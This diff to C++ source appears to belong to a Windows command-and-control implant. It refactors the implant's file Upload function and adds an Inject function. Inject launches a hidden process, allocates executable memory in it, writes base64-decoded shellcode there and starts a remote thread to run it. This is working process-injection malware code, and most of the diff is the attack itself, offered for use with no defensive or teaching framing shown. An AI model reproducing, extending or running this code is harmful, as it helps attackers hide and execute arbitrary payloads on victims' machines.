@@ -222,19 +222,10 @@ void UpdateProfile(rapidjson::Value* changes, MalleableProfile* currentProfile) 
     }
 }
 
-std::string Upload(rapidjson::Value* uploaded) {
+std::string Upload(std::string fileName, std::string b64Contents) {
     CHAR path [200];
     CHAR fullPath [200];
-    std::string fileName;
-	std::string b64Contents;
-    rapidjson::Value::ConstMemberIterator itr = uploaded->MemberBegin();
-    for (; itr != uploaded->MemberEnd(); ++itr) {
-        if (itr->name == OBFUSCATED("name")) {
-            fileName = itr->value.GetString();
-        } else if (itr->name == OBFUSCATED("contents")) {
-            b64Contents = itr->value.GetString();
-        }
-    }
+
     std::vector<BYTE> bytes = base64Decode(b64Contents);
     GetTempPathA(80, path);
     PathCombineA(fullPath, path, fileName.c_str());
@@ -283,4 +274,41 @@ std::string Download(std::string filepath) {
     vec.reserve(bytes_read);
     vec.assign(raw_buffer, raw_buffer + bytes_read);
     return base64Encode(vec);
+}
+
+std::string Inject(std::string b64shellcode, std::string processName) {
+    std::vector<BYTE> shellcode = base64Decode(b64shellcode);
+    HANDLE processHandle;
+    HANDLE remoteThread;
+    PVOID remoteBuffer;
+    STARTUPINFO startupInfo;
+    PROCESS_INFORMATION process_info;
+
+    memset(&processHandle, 0, sizeof(processHandle));
+    memset(&startupInfo, 0, sizeof(startupInfo));
+
+    startupInfo.cb = sizeof(startupInfo);
+    startupInfo.dwFlags = 1;
+    startupInfo.wShowWindow = 0;
+
+    if (CreateProcessA(NULL, (LPSTR)(processName.c_str()), NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &process_info) == 0) {
+        return "ERROR";
+    }
+    CloseHandle(process_info.hThread);
+    remoteBuffer = VirtualAllocEx(process_info.hProcess, NULL, shellcode.size() * sizeof(BYTE), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    if (remoteBuffer == NULL) {
+        CloseHandle(process_info.hProcess);
+        return "ERROR";
+    }
+    if (WriteProcessMemory(process_info.hProcess, remoteBuffer, &shellcode[0], shellcode.size() * sizeof(BYTE), NULL) == 0) {
+        CloseHandle(process_info.hProcess);
+        return "ERROR";
+    }
+    remoteThread = CreateRemoteThread(process_info.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+    if (remoteThread == NULL) {
+        CloseHandle(process_info.hProcess);
+        return "ERROR";
+    }
+    CloseHandle(process_info.hProcess);
+    return "OK";
 }
